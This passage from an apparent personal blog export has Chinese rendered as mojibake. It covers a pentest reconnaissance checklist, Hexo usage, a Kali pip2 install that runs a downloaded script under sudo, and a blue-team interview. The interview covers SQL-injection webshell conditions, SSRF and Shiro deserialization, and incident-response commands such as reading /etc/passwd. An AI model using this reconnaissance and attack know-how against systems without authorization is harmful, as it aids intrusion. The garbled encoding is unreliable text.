<h3 id="whoiså‘½ä»¤æŸ¥è¯¢"><a href="#whoiså‘½ä»¤æŸ¥è¯¢" class="headerlink" title="whoiså‘½ä»¤æŸ¥è¯¢"></a>whoiså‘½ä»¤æŸ¥è¯¢</h3><p>kaliä¸­è‡ªå¸¦whoisæŸ¥è¯¢å·¥å…·  <code>whois åŸŸå</code>è¿›è¡ŒæŸ¥è¯¢</p>
<h2 id="å­åŸŸåä¿¡æ¯æ”¶é›†"><a href="#å­åŸŸåä¿¡æ¯æ”¶é›†" class="headerlink" title="å­åŸŸåä¿¡æ¯æ”¶é›†"></a>å­åŸŸåä¿¡æ¯æ”¶é›†</h2><h3 id="å­åŸŸåæ”¶é›†å·¥å…·"><a href="#å­åŸŸåæ”¶é›†å·¥å…·" class="headerlink" title="å­åŸŸåæ”¶é›†å·¥å…·"></a>å­åŸŸåæ”¶é›†å·¥å…·</h3><ol>
<li>layerå­åŸŸåæŒ–æ˜æœº</li>
<li>subDomainsBrute</li>
<li>Maltego CE</li>
<li>dnsenum</li>
</ol>
<br>

<h2 id="æ—ç«™-Cæ®µ"><a href="#æ—ç«™-Cæ®µ" class="headerlink" title="æ—ç«™/Cæ®µ"></a>æ—ç«™/Cæ®µ</h2><ul>
<li>æ—ç«™æŸ¥è¯¢ï¼š<a href="https://whois.chinaz.com/">https://whois.chinaz.com/</a></li>
<li>åœ¨çº¿å·¥å…·ï¼š<a href="http://stool.chinaz.com/same">http://stool.chinaz.com/same</a></li>
<li>åœ¨çº¿å·¥å…·ï¼š<a href="https://www.webscan.cc/">https://www.webscan.cc/</a></li>
<li>CDNæ£€æµ‹ï¼š<a href="https://www.17ce.com/">https://www.17ce.com/</a></li>
</ul>
<h2 id="CMSæŒ‡çº¹è¯†åˆ«"><a href="#CMSæŒ‡çº¹è¯†åˆ«" class="headerlink" title="CMSæŒ‡çº¹è¯†åˆ«"></a>CMSæŒ‡çº¹è¯†åˆ«</h2><ul>
<li><p>åœ¨çº¿æŒ‡çº¹è¯†åˆ«ï¼š<a href="http://whatweb.bugscaner.com/look/">http://whatweb.bugscaner.com/look/</a></p>
</li>
<li><p>æ½®æ±æŒ‡çº¹ï¼š<a href="http://finger.tidesec.com/">http://finger.tidesec.com/</a></p>
</li>
</ul>
<h2 id="ç›®å½•æ‰«æ"><a href="#ç›®å½•æ‰«æ" class="headerlink" title="ç›®å½•æ‰«æ"></a>ç›®å½•æ‰«æ</h2><ul>
<li>å¾¡å‰‘</li>
<li>dirsearch</li>
<li>DirBuster</li>
</ul>
<br>

<h2 id="ç«¯å£ä¿¡æ¯"><a href="#ç«¯å£ä¿¡æ¯" class="headerlink" title="ç«¯å£ä¿¡æ¯"></a>ç«¯å£ä¿¡æ¯</h2><h3 id="ç«¯å£æ¢æµ‹"><a href="#ç«¯å£æ¢æµ‹" class="headerlink" title="ç«¯å£æ¢æµ‹"></a>ç«¯å£æ¢æµ‹</h3><ul>
<li>nmap</li>
<li>masscan</li>
<li>ä½¿ç”¨åœ¨çº¿ç½‘ç«™æ¢æµ‹ <a href="http://tool.chinaz.com/port/">http://tool.chinaz.com/port/</a></li>
</ul>
<h3 id="é˜²å¾¡æªæ–½"><a href="#é˜²å¾¡æªæ–½" class="headerlink" title="é˜²å¾¡æªæ–½"></a>é˜²å¾¡æªæ–½</h3><ul>
<li>å…³é—­ä¸å¿…è¦çš„ç«¯å£</li>
<li>å¯¹é‡è¦ä¸šåŠ¡çš„æœåŠ¡ç«¯å£è®¾ç½®é˜²ç«å¢™</li>
<li>ç»å¸¸æ€§æ›´æ”¹ç”¨æˆ·å¯†ç </li>
</ul>
<br>

<h2 id="ç½‘ç»œç©ºé—´æœç´¢å¼•æ“"><a href="#ç½‘ç»œç©ºé—´æœç´¢å¼•æ“" class="headerlink" title="ç½‘ç»œç©ºé—´æœç´¢å¼•æ“"></a>ç½‘ç»œç©ºé—´æœç´¢å¼•æ“</h2><ul>
<li>fofa: <a href="https://fofa.so/">https://fofa.so/</a></li>
<li>é’Ÿé¦—ä¹‹çœ¼ï¼š<a href="http://www.zoomeye.org/">http://www.zoomeye.org</a></li>
<li>Shodanï¼š<a href="https://www.shodan.io/">https://www.shodan.io</a></li>
</ul>
<h2 id="GitHubæ•æ„Ÿä¿¡æ¯æ³„æ¼"><a href="#GitHubæ•æ„Ÿä¿¡æ¯æ³„æ¼" class="headerlink" title="GitHubæ•æ„Ÿä¿¡æ¯æ³„æ¼"></a>GitHubæ•æ„Ÿä¿¡æ¯æ³„æ¼</h2><p><a href="https://www.cnblogs.com/ichunqiu/p/10149471.html">https://www.cnblogs.com/ichunqiu/p/10149471.html</a></p>
]]></content>
      <categories>
        <category>ä¿¡æ¯æ”¶é›†</category>
      </categories>
      <tags>
        <tag>ä¿¡æ¯æ”¶é›†</tag>
      </tags>
  </entry>
  <entry>
    <title>hexoåŸºæœ¬ä½¿ç”¨</title>
    <url>/posts/d4fee3ae/</url>
    <content><![CDATA[<p><code>hexo g </code> == <code>hexo generate </code> #ç”Ÿäº§é™æ€ç½‘é¡µ<br><code>hexo s </code> == <code>hexo server</code> #å¯åŠ¨æœåŠ¡é¢„è§ˆ<br><code>hexo d</code> == <code>hexo deploy</code> #éƒ¨ç½²<br><code>hexo clean</code> #æ¸…é™¤ç¼“å­˜</p>
<h3 id="å†™æ–‡ç« "><a href="#å†™æ–‡ç« " class="headerlink" title="å†™æ–‡ç« "></a>å†™æ–‡ç« </h3><p><code>hexo new post â€œæ ‡é¢˜â€</code>  æ–°å»ºä¸€ç¯‡æ–‡ç«   ç„¶åä¼šåœ¨_postç›®å½•ä¸‹æ‰¾åˆ°æ–°å¢çš„.mdæ–‡ä»¶ï¼Œç”¨æ­¤æ–‡ä»¶æ¥å­˜æ–¹æ‰€ä¹ å¾—å†…å®¹ç¼–å†™å®Œmarkdownæ–‡ä»¶åï¼Œæ ¹ç›®å½•ä¸‹è¾“å…¥<code> hexo g</code>ç”Ÿäº§é™æ€é¡µé¢ã€‚è¾“å…¥<code>hexo s</code>æœ¬åœ°é¢„è§ˆæ•ˆæœï¼Œ<code>hexo d</code>ä¸Šä¼ è‡³GitHub</p>
]]></content>
      <categories>
        <category>Hexo</category>
      </categories>
      <tags>
        <tag>Hexo</tag>
      </tags>
  </entry>
  <entry>
    <title>hexoæ–‡ç« æ¨¡æ¿è®¾ç½®</title>
    <url>/posts/2b14b1c3/</url>
    <content><![CDATA[<p>æ‰“å¼€hexoé¡¹ç›®æ–‡ä»¶å¤¹å¼ çš„scaffoldä¸­çš„<code>post.md</code>å’Œ<code>draft.md</code>,å¹¶ä¿®æ”¹<br>å¯¹åº”çš„æ˜¯ <code>hexo new &lt;title&gt;</code> é»˜è®¤æ˜¯<code>post</code>ï¼Œè‰ç¨¿æ˜¯<code>draft</code></p>
<blockquote>
<hr>
<p>title: hexoæ–‡ç« æ¨¡æ¿è®¾ç½®<br>tags:<br>categories:<br>description:<br>date: 1616291706000</p>
<hr>
</blockquote>
]]></content>
      <categories>
        <category>Hexo</category>
      </categories>
      <tags>
        <tag>Hexo</tag>
      </tags>
  </entry>
  <entry>
    <title>ä½¿ç”¨proxychains4gitcloneæ‹’ç»è®¿é—®</title>
    <url>/posts/3a6e39d4/</url>
    <content><![CDATA[<p>é—®é¢˜:Ubuntuä½¿ç”¨proxychain4 git clone æŠ¥é”™ 192.168.3.11 1080 æ‹’ç»è®¿é—®<br>åŸå› : ç«¯å£è¢«å ç”¨äº†ï¼Œä¹‹å‰åœ¨è™šæ‹ŸæœºUbuntuçš„ä»£ç†åœ°æ–¹è®¾ç½®äº†ä»£ç†ï¼Œå†ç”¨ä½¿ç”¨proxychain4ï¼ŒæŠŠåœ¨è™šæ‹Ÿæœºä¸­çš„ä»£ç†è®¾ç½®å–æ¶ˆæ‰å°±å¯ä»¥äº†</p>
]]></content>
      <categories>
        <category>Linux</category>
      </categories>
      <tags>
        <tag>Linux</tag>
      </tags>
  </entry>
  <entry>
    <title>kaliå®‰è£…pip2</title>
    <url>/posts/6b338ac1/</url>
    <content><![CDATA[<p><code>kali å®‰è£…pip2</code><br><code>wget https://bootstrap.pypa.io/pip/2.6/get-pip.py</code><br><code>sudo python2 get-pip.py</code><br><code>pip2 -V</code><br>å‡çº§ç‰ˆæœ¬<br><code>sudo pip2 install --upgrade pip</code></p>
]]></content>
      <categories>
        <category>Linux</category>
      </categories>
      <tags>
        <tag>Linux</tag>
      </tags>
  </entry>
  <entry>
    <title>è®°ä¸€æ¬¡hwé¢è¯•ç»å†(1)</title>
    <url>/posts/40769f33/</url>
    <content><![CDATA[<h1 id="ä¸€é¢"><a href="#ä¸€é¢" class="headerlink" title="ä¸€é¢:"></a>ä¸€é¢:</h1><h3 id="å¦‚ä½•æ¥è§¦ç½‘ç»œå®‰å…¨çš„"><a href="#å¦‚ä½•æ¥è§¦ç½‘ç»œå®‰å…¨çš„" class="headerlink" title="å¦‚ä½•æ¥è§¦ç½‘ç»œå®‰å…¨çš„"></a>å¦‚ä½•æ¥è§¦ç½‘ç»œå®‰å…¨çš„</h3><p>ç­”ï¼šåœ¨å¤§ä¸€æ—¶å¼€å§‹æ¥è§¦CTFï¼Œé‚£æ—¶å€™å¼€å§‹æ­£å¼æ¥è§¦å®‰å…¨ï¼Œç„¶ååé¢ä¸»è¦æ˜¯å­¦ä¹ çš„webå®‰å…¨ï¼Œç»å¸¸ä¼šçœ‹å…ˆçŸ¥ç¤¾åŒºï¼Œfreebufï¼Œcsdnå’Œä¹Œäº‘<span id="more"></span>ä¹‹ç±»çš„ç¤¾åŒºæ–‡ç« å­¦ä¹ </p>
<h3 id="æœ‰æ— æ¥è§¦è¿‡å®‰å…¨è®¾å¤‡"><a href="#æœ‰æ— æ¥è§¦è¿‡å®‰å…¨è®¾å¤‡" class="headerlink" title="æœ‰æ— æ¥è§¦è¿‡å®‰å…¨è®¾å¤‡"></a>æœ‰æ— æ¥è§¦è¿‡å®‰å…¨è®¾å¤‡</h3><p>ç­”ï¼šæ²¡æ¥è§¦è¿‡ã€‚</p>
<h3 id="æ˜¯å¦ç†Ÿæ‚‰windowsæˆ–è€…linuxå‘½ä»¤çš„ä½¿ç”¨"><a href="#æ˜¯å¦ç†Ÿæ‚‰windowsæˆ–è€…linuxå‘½ä»¤çš„ä½¿ç”¨" class="headerlink" title="æ˜¯å¦ç†Ÿæ‚‰windowsæˆ–è€…linuxå‘½ä»¤çš„ä½¿ç”¨"></a>æ˜¯å¦ç†Ÿæ‚‰windowsæˆ–è€…linuxå‘½ä»¤çš„ä½¿ç”¨</h3><p>ç­”ï¼šä¹‹å‰æœ‰å­¦ä¹ è¿‡Linuxï¼Œå¯¹äºLinuxå’ŒWindowsçš„åŸºæœ¬å‘½ä»¤æ“ä½œ<!--more-->éƒ½å¯ä»¥ç†Ÿæ‚‰ä½¿ç”¨ã€‚&lt; !â€“moreâ€“&gt;</p>
<h3 id="è¯´ä¸€ä¸‹å¦‚ä½•è¿›è¡Œä¿¡æ¯æ”¶é›†"><a href="#è¯´ä¸€ä¸‹å¦‚ä½•è¿›è¡Œä¿¡æ¯æ”¶é›†" class="headerlink" title="è¯´ä¸€ä¸‹å¦‚ä½•è¿›è¡Œä¿¡æ¯æ”¶é›†"></a>è¯´ä¸€ä¸‹å¦‚ä½•è¿›è¡Œä¿¡æ¯æ”¶é›†</h3><p>ç­”ï¼šç•¥</p>
<h3 id="sqlæ³¨å…¥å†™shellçš„æ¡ä»¶"><a href="#sqlæ³¨å…¥å†™shellçš„æ¡ä»¶" class="headerlink" title="sqlæ³¨å…¥å†™shellçš„æ¡ä»¶"></a>sqlæ³¨å…¥å†™shellçš„æ¡ä»¶</h3><p>ç­”ï¼š<br>1.æ‹¥æœ‰rootæƒé™<br>2.çŸ¥é“ç½‘ç«™ç»å¯¹è·¯å¾„<br>3.å¼€å¯PHPçš„å…¨å±€gpc<br>4 åœ¨å†™å…¥çš„ç›®å½•ä¸‹æœ‰å†™å…¥æƒé™</p>
<h3 id="xssçš„é˜²å¾¡"><a href="#xssçš„é˜²å¾¡" class="headerlink" title="xssçš„é˜²å¾¡"></a>xssçš„é˜²å¾¡</h3><p>ç­”ï¼š1.è¿›è¡Œå®ä½“ç¼–ç <br>       2.å¯¹ç‰¹æ®Šå­—ç¬¦è¿›è¡Œè¿‡æ»¤</p>
<h3 id="è¯´ä¸€ä¸‹ssrfçš„åŸç†åŠåˆ©ç”¨"><a href="#è¯´ä¸€ä¸‹ssrfçš„åŸç†åŠåˆ©ç”¨" class="headerlink" title="è¯´ä¸€ä¸‹ssrfçš„åŸç†åŠåˆ©ç”¨"></a>è¯´ä¸€ä¸‹ssrfçš„åŸç†åŠåˆ©ç”¨</h3><p>ç­”ï¼šssrfæ˜¯ä¸€ä¸ªæ”»å‡»è€…æ„é€ å½¢æˆä»æœåŠ¡å™¨ç«¯å‘èµ·çš„å®‰å…¨æ¼æ´ï¼Œä¸€èˆ¬åœ¨æœåŠ¡å™¨è·å–å›¾ç‰‡ï¼Œæ–‡æœ¬ä¹‹ç±»çš„åœ°æ–¹çœ‹åˆ°æœ‰å¼•ç”¨å…¶ä»–æ–‡ä»¶çš„åœ°æ–¹å¯ä»¥å°è¯•ä¸€ä¸‹æ˜¯å¦æœ‰ssrfå­˜åœ¨<br>åˆ©ç”¨ï¼š<br>1.å¯ä»¥ç”¨æ¥å¯¹å†…ç½‘ç«¯å£æ‰«æ<br>2.è¿›è¡Œæ–‡ä»¶è¯»å–</p>
<h3 id="æœ‰æ²¡æœ‰æ¥è§¦è¿‡shiroæ¼æ´"><a href="#æœ‰æ²¡æœ‰æ¥è§¦è¿‡shiroæ¼æ´" class="headerlink" title="æœ‰æ²¡æœ‰æ¥è§¦è¿‡shiroæ¼æ´"></a>æœ‰æ²¡æœ‰æ¥è§¦è¿‡shiroæ¼æ´</h3><p>ç­”ï¼šè®°ç€ä»¥å‰å¤ç°è¿‡shiroçš„ååºåˆ—åŒ–ï¼Œä¸»è¦æ˜¯åœ¨remembermeå¤„ï¼Œå…¶è§£æä¸ºremembermeçš„cookieå€¼â€“ base64â€“aesè§£å¯†â€“ååºåˆ—åŒ–</p>
<h3 id="æœ‰æ²¡æœ‰æº¯æºçš„ç»å†"><a href="#æœ‰æ²¡æœ‰æº¯æºçš„ç»å†" class="headerlink" title="æœ‰æ²¡æœ‰æº¯æºçš„ç»å†"></a>æœ‰æ²¡æœ‰æº¯æºçš„ç»å†</h3><p>ç­”ï¼šä¹‹å‰å­¦æ ¡å›¾ä¹¦é¦†æœ‰è¿‡ä¸€æ¬¡è¢«å…¥ä¾µçš„ç»å†ï¼Œå½“æ—¶å»çœ‹äº†ä¸€ä¸‹ï¼Œç”±äºç¬¬ä¸€æ¬¡æ¥è§¦å°±å­¦äº†ä¸‹ç›¸å…³å†…å®¹</p>
<h3 id="è¯´ä¸€ä¸‹åº”æ€¥å“åº”çš„åŸºæœ¬æµç¨‹"><a href="#è¯´ä¸€ä¸‹åº”æ€¥å“åº”çš„åŸºæœ¬æµç¨‹" class="headerlink" title="è¯´ä¸€ä¸‹åº”æ€¥å“åº”çš„åŸºæœ¬æµç¨‹"></a>è¯´ä¸€ä¸‹åº”æ€¥å“åº”çš„åŸºæœ¬æµç¨‹</h3><p>ç­”ï¼šå¯¹äºWindowsç«¯çš„åé—¨æ’é™¤</p>
<h4 id="å¯ä»¥ä½¿ç”¨ä¸€äº›å®‰å…¨å·¥å…·ï¼šdç›¾ï¼Œlogparserï¼Œautorunsï¼Œprocess-explorerç­‰"><a href="#å¯ä»¥ä½¿ç”¨ä¸€äº›å®‰å…¨å·¥å…·ï¼šdç›¾ï¼Œlogparserï¼Œautorunsï¼Œprocess-explorerç­‰" class="headerlink" title="å¯ä»¥ä½¿ç”¨ä¸€äº›å®‰å…¨å·¥å…·ï¼šdç›¾ï¼Œlogparserï¼Œautorunsï¼Œprocess explorerç­‰"></a>å¯ä»¥ä½¿ç”¨ä¸€äº›å®‰å…¨å·¥å…·ï¼šdç›¾ï¼Œlogparserï¼Œautorunsï¼Œprocess explorerç­‰</h4><h4 id="é¡¹ç›®æ£€æŸ¥"><a href="#é¡¹ç›®æ£€æŸ¥" class="headerlink" title="é¡¹ç›®æ£€æŸ¥"></a>é¡¹ç›®æ£€æŸ¥</h4><p>æ³¨å†Œè¡¨å¯åŠ¨é¡¹<br>ç½‘ç»œè¿æ¥<br>æ¶æ„è¿›ç¨‹<br>ç³»ç»ŸæœåŠ¡<br>è®¡åˆ’ä»»åŠ¡</p>
<h4 id="æ—¥å¿—åˆ†æ"><a href="#æ—¥å¿—åˆ†æ" class="headerlink" title="æ—¥å¿—åˆ†æ"></a>æ—¥å¿—åˆ†æ</h4><p>å¯ä»¥ä½¿ç”¨logparseræ ¼å¼åŒ–åè¿›è¡Œåˆ†æ<br>ä¹Ÿå¯ä»¥ä½¿ç”¨Windowsçš„äº‹ä»¶æŸ¥çœ‹å™¨è¿›è¡Œåˆ†æ</p>
<h4 id="æ£€æŸ¥æ˜¯å¦å­˜åœ¨shiftç²˜æ»é”®åé—¨"><a href="#æ£€æŸ¥æ˜¯å¦å­˜åœ¨shiftç²˜æ»é”®åé—¨" class="headerlink" title="æ£€æŸ¥æ˜¯å¦å­˜åœ¨shiftç²˜æ»é”®åé—¨"></a>æ£€æŸ¥æ˜¯å¦å­˜åœ¨shiftç²˜æ»é”®åé—¨</h4><p>å¯¹äºLinuxç«¯<br>1.æŸ¥çœ‹å¼‚å¸¸è´¦å·        cat /etc/passwd<br>2.æŸ¥çœ‹è¿›ç¨‹              ps -ef ä¸¨more<br>3.æŸ¥çœ‹ç½‘ç»œè¿æ¥       netstat -anplt<br>4.è®¡åˆ’ä»»åŠ¡<br>5.ç³»ç»Ÿå¯åŠ¨é¡¹<br>6.ç³»ç»Ÿæ—¥å¿—</p>
<h4 id="å¯¹äºwebæœåŠ¡å™¨"><a href="#å¯¹äºwebæœåŠ¡å™¨" class="headerlink" title="å¯¹äºwebæœåŠ¡å™¨"></a>å¯¹äºwebæœåŠ¡å™¨</h4><p>å¯ä»¥æŸ¥çœ‹ä¸­é—´ä»¶é…ç½®å’Œç›¸å…³æ—¥å¿—<br>å½“ç„¶ä¹Ÿè¦è€ƒè™‘æµè§ˆå™¨åŠ«æŒé—®é¢˜<br>f12æŸ¥çœ‹ç½‘ç»œçš„åŠ è½½</p>
<h3 id="æœ‰æ²¡æœ‰é¢è¯•è¿‡å…¶ä»–å…¬å¸çš„hw"><a href="#æœ‰æ²¡æœ‰é¢è¯•è¿‡å…¶ä»–å…¬å¸çš„hw" class="headerlink" title="æœ‰æ²¡æœ‰é¢è¯•è¿‡å…¶ä»–å…¬å¸çš„hw"></a>æœ‰æ²¡æœ‰é¢è¯•è¿‡å…¶ä»–å…¬å¸çš„hw</h3><p>ç­”ï¼šæ²¡æœ‰</p>
<h3 id="æœŸæœ›çš„è–ªèµ„æ˜¯å¤šå°‘"><a href="#æœŸæœ›çš„è–ªèµ„æ˜¯å¤šå°‘" class="headerlink" title="æœŸæœ›çš„è–ªèµ„æ˜¯å¤šå°‘"></a>æœŸæœ›çš„è–ªèµ„æ˜¯å¤šå°‘</h3><p><em>é¢è¯•éš¾åº¦ï¼šæ˜“<br>é¢è¯•ç»“æœï¼šé€šè¿‡</em></p>
<h1 id="äºŒé¢"><a href="#äºŒé¢" class="headerlink" title="äºŒé¢:"></a>äºŒé¢:</h1><h3 id="ä½ å¥½ï¼Œæˆ‘ä»¬æ˜¯xxxï¼Œè¯·é—®ä½ æ˜¯xxxå—ï¼Œç°åœ¨æ–¹ä¾¿å—ï¼Ÿ"><a href="#ä½ å¥½ï¼Œæˆ‘ä»¬æ˜¯xxxï¼Œè¯·é—®ä½ æ˜¯xxxå—ï¼Œç°åœ¨æ–¹ä¾¿å—ï¼Ÿ" class="headerlink" title="ä½ å¥½ï¼Œæˆ‘ä»¬æ˜¯xxxï¼Œè¯·é—®ä½ æ˜¯xxxå—ï¼Œç°åœ¨æ–¹ä¾¿å—ï¼Ÿ"></a>ä½ å¥½ï¼Œæˆ‘ä»¬æ˜¯xxxï¼Œè¯·é—®ä½ æ˜¯xxxå—ï¼Œç°åœ¨æ–¹ä¾¿å—ï¼Ÿ</h3><p>ç­”ï¼šæ‚¨å¥½ï¼Œæ˜¯çš„ï¼Œç°åœ¨æ–¹ä¾¿ï¼Œæ‚¨è®²ã€‚</p>
<h3 id="ä½ å…ˆè¯´ä¸€ä¸‹ä»€ä¹ˆæ˜¯æŠ¤ç½‘ï¼ŒæŠ¤ç½‘çš„èƒŒæ™¯"><a href="#ä½ å…ˆè¯´ä¸€ä¸‹ä»€ä¹ˆæ˜¯æŠ¤ç½‘ï¼ŒæŠ¤ç½‘çš„èƒŒæ™¯" class="headerlink" title="ä½ å…ˆè¯´ä¸€ä¸‹ä»€ä¹ˆæ˜¯æŠ¤ç½‘ï¼ŒæŠ¤ç½‘çš„èƒŒæ™¯"></a>ä½ å…ˆè¯´ä¸€ä¸‹ä»€ä¹ˆæ˜¯æŠ¤ç½‘ï¼ŒæŠ¤ç½‘çš„èƒŒæ™¯</h3><p>ç­”ï¼šç•¥</p>
<h3 id="è¯´ä¸€ä¸‹hwé˜²å®ˆæ–¹æµç¨‹"><a href="#è¯´ä¸€ä¸‹hwé˜²å®ˆæ–¹æµç¨‹" class="headerlink" title="è¯´ä¸€ä¸‹hwé˜²å®ˆæ–¹æµç¨‹"></a>è¯´ä¸€ä¸‹hwé˜²å®ˆæ–¹æµç¨‹</h3><p>ç­”ï¼šå‰æœŸéœ€è¦å¯¹èµ„äº§è¿›è¡Œæ¢³ç†ï¼Œæ’æŸ¥æš´éœ²é¢å’Œæ•æ„Ÿä¿¡æ¯ï¼Œä¸­æœŸè¦7*24hå€¼å®ˆï¼ŒåŠæ—¶å†™æ—¥æŠ¥å’Œå‘¨æŠ¥ï¼ŒåæœŸå°±éœ€è¦æ€»ç»“å’Œæ•´æ”¹</p>
<h3 id="ä½ è¯´ä¸€ä¸‹struct2-ç‰¹å¾"><a href="#ä½ è¯´ä¸€ä¸‹struct2-ç‰¹å¾" class="headerlink" title="ä½ è¯´ä¸€ä¸‹struct2 ç‰¹å¾"></a>ä½ è¯´ä¸€ä¸‹struct2 ç‰¹å¾</h3><p>ç­”ï¼šæ²¡æ€ä¹ˆäº†è§£è¿‡ï¼ŒåªçŸ¥é“æœ‰rceæ¼æ´ï¼ˆ.action .doï¼‰</p>
<h3 id="çœ‹ä½ ç®€å†ä¸Šæœ‰è¿‡å›¾ä¹¦é¦†æº¯æºç»å†ï¼Œä½ ç®€å•è¯´ä¸€ä¸‹æº¯æºç»å†"><a href="#çœ‹ä½ ç®€å†ä¸Šæœ‰è¿‡å›¾ä¹¦é¦†æº¯æºç»å†ï¼Œä½ ç®€å•è¯´ä¸€ä¸‹æº¯æºç»å†" class="headerlink" title="çœ‹ä½ ç®€å†ä¸Šæœ‰è¿‡å›¾ä¹¦é¦†æº¯æºç»å†ï¼Œä½ ç®€å•è¯´ä¸€ä¸‹æº¯æºç»å†"></a>çœ‹ä½ ç®€å†ä¸Šæœ‰è¿‡å›¾ä¹¦é¦†æº¯æºç»å†ï¼Œä½ ç®€å•è¯´ä¸€ä¸‹æº¯æºç»å†</h3><p>ç­”ï¼šå»å¹´æˆ‘ä»¬å­¦æ ¡å›¾ä¹¦é¦†åˆè¢«å…¥ä¾µè¿‡ï¼Œè€å¸ˆè®©æˆ‘ä»¬è¿‡å»çœ‹ä¸€ä¸‹ï¼Œå› ä¸ºå½“æ—¶æ˜¯ç¬¬ä¸€æ¬¡æ¥è§¦ï¼Œå°±å­¦ä¹ ä¸€ä¸‹</p>
<h3 id="ä½¿ç”¨äº‹ä»¶æŸ¥çœ‹å™¨æŸ¥çœ‹ä¸€ä¸‹æ˜¯å¦å­˜åœ¨å¼‚å¸¸äº‹ä»¶"><a href="#ä½¿ç”¨äº‹ä»¶æŸ¥çœ‹å™¨æŸ¥çœ‹ä¸€ä¸‹æ˜¯å¦å­˜åœ¨å¼‚å¸¸äº‹ä»¶" class="headerlink" title="ä½¿ç”¨äº‹ä»¶æŸ¥çœ‹å™¨æŸ¥çœ‹ä¸€ä¸‹æ˜¯å¦å­˜åœ¨å¼‚å¸¸äº‹ä»¶"></a>ä½¿ç”¨äº‹ä»¶æŸ¥çœ‹å™¨æŸ¥çœ‹ä¸€ä¸‹æ˜¯å¦å­˜åœ¨å¼‚å¸¸äº‹ä»¶</h3><h3 id="é‚£ä½ è¯´ä¸€ä¸‹å¼‚å¸¸äº‹ä»¶æœ‰å“ªäº›ï¼Ÿ"><a href="#é‚£ä½ è¯´ä¸€ä¸‹å¼‚å¸¸äº‹ä»¶æœ‰å“ªäº›ï¼Ÿ" class="headerlink" title="é‚£ä½ è¯´ä¸€ä¸‹å¼‚å¸¸äº‹ä»¶æœ‰å“ªäº›ï¼Ÿ"></a>é‚£ä½ è¯´ä¸€ä¸‹å¼‚å¸¸äº‹ä»¶æœ‰å“ªäº›ï¼Ÿ</h3><p>ç­”ï¼šè¿™ä¸ªä¸æ˜¯å¾ˆäº†è§£</p>
<h3 id="é‚£ä½ ç»§ç»­è¯´"><a href="#é‚£ä½ ç»§ç»­è¯´" class="headerlink" title="é‚£ä½ ç»§ç»­è¯´"></a>é‚£ä½ ç»§ç»­è¯´</h3><p>ç­”ï¼šå¯ä»¥æŸ¥çœ‹ä¸€ä¸‹å¼€æ”¾çš„ç«¯å£ï¼Œå¹¶å…³é—­ä¸€äº›ä¸å¿…è¦çš„</p>
<h3 id="é‚£ä½ ç”¨ä»€ä¹ˆæŸ¥çœ‹å‘¢"><a href="#é‚£ä½ ç”¨ä»€ä¹ˆæŸ¥çœ‹å‘¢" class="headerlink" title="é‚£ä½ ç”¨ä»€ä¹ˆæŸ¥çœ‹å‘¢"></a>é‚£ä½ ç”¨ä»€ä¹ˆæŸ¥çœ‹å‘¢</h3><p>ç­”ï¼šnetstat -anlpt</p>
<h3 id="é‚£ä½ éƒ½å…³é—­äº†é‚£äº›ç«¯å£å‘¢"><a href="#é‚£ä½ éƒ½å…³é—­äº†é‚£äº›ç«¯å£å‘¢" class="headerlink" title="é‚£ä½ éƒ½å…³é—­äº†é‚£äº›ç«¯å£å‘¢"></a>é‚£ä½ éƒ½å…³é—­äº†é‚£äº›ç«¯å£å‘¢</h3><p>ç­”ï¼šè¿™ä¸ªå¥½åƒä¸å¤ªè®°å¾—äº†ï¼Œå¥½åƒå…³é—­äº†3389ä¹‹ç±»çš„ï¼Œè¿˜å…³é—­äº†ä¸€ä¸ªæ•°æ®åº“çš„åº”è¯¥æ˜¯ï¼Œè®°ä¸æ¸…æ¥šäº†ï¼Œå› ä¸ºè¿™ä¸ªå›¾ä¹¦é¦†ç®¡ç†ç³»ç»Ÿæ˜¯è€å¸ˆè‡ªå·±ç”¨phpstudyæ­å»ºçš„ã€‚å½“æ—¶è¿˜æŸ¥çœ‹äº†ä¸€ä¸‹ç³»ç»Ÿè´¦å·å‘ç°æœ‰å‡ ä¸ªè¢«äººæ·»åŠ è¿‡çš„è´¦å·ï¼Œä¹Ÿå­˜åœ¨éšè—ç”¨æˆ·</p>
<h3 id="é‚£ä½ è¯´ä¸€ä¸‹æ˜¯æ€ä¹ˆå‘ç°éšè—è´¦æˆ·çš„å‘¢"><a href="#é‚£ä½ è¯´ä¸€ä¸‹æ˜¯æ€ä¹ˆå‘ç°éšè—è´¦æˆ·çš„å‘¢" class="headerlink" title="é‚£ä½ è¯´ä¸€ä¸‹æ˜¯æ€ä¹ˆå‘ç°éšè—è´¦æˆ·çš„å‘¢"></a>é‚£ä½ è¯´ä¸€ä¸‹æ˜¯æ€ä¹ˆå‘ç°éšè—è´¦æˆ·çš„å‘¢</h3><p>ç­”ï¼šæˆ‘è®°ç€åœ¨æ³¨å†Œè¡¨çš„â€œsamâ€ï¼ˆå½“æ—¶è®°ä¸èµ·æ¥å…·ä½“å«ä»€ä¹ˆäº†ï¼‰ç„¶åå»æ‰¾æ˜¯å¦å­˜åœ¨éšè—è´¦å·</p>
<h3 id="é‚£éšè—è´¦æˆ·æœ‰ä»€ä¹ˆç‰¹å¾å‘¢ï¼Ÿ"><a href="#é‚£éšè—è´¦æˆ·æœ‰ä»€ä¹ˆç‰¹å¾å‘¢ï¼Ÿ" class="headerlink" title="é‚£éšè—è´¦æˆ·æœ‰ä»€ä¹ˆç‰¹å¾å‘¢ï¼Ÿ"></a>é‚£éšè—è´¦æˆ·æœ‰ä»€ä¹ˆç‰¹å¾å‘¢ï¼Ÿ</h3><p>ç­”ï¼šéšè—è´¦æˆ·éƒ½ä¼šæœ‰~ï¼ˆå½“æ—¶å¿˜è®°äº†æ˜¯$ï¼Œç„¶åhrä¹Ÿæœ‰ç‚¹ç–‘é—®ï¼Œä½†å°±æ˜¯æ²¡æƒ³èµ·æ¥ï¼Œéšè—ç”¨æˆ·ç”¨$ç¬¦ï¼Œå½“æ—¶å›ç­”æ—¶é”™è¯´æˆäº†~éšè—ç”¨æˆ·<br>æŸ¥çœ‹æ³¨å†Œè¡¨ samä¸‹ domains account usersæŸ¥çœ‹usersè¡¨é¡¹ä¸­ä¸namesè¡¨é¡¹ä¸­é¡¹æ•°é‡æ˜¯å¦ä¸€è‡´å¦‚æœä¸€è‡´å°±æ²¡æœ‰éšè—ç”¨æˆ·å¦‚æœä¸ä¸€è‡´ï¼Œå°±å¯¹ç…§å…¶ä»–ç”µè„‘ç”¨æˆ·æ³¨å†Œè¡¨ï¼Œå³å¯æ‰¾å‡ºå…¶ä»–éšè—ç”¨æˆ·äº‹ä»¶æŸ¥çœ‹å™¨ï¼ŒæŸ¥çœ‹å¼‚å¸¸äº‹ä»¶ï¼‰</p>
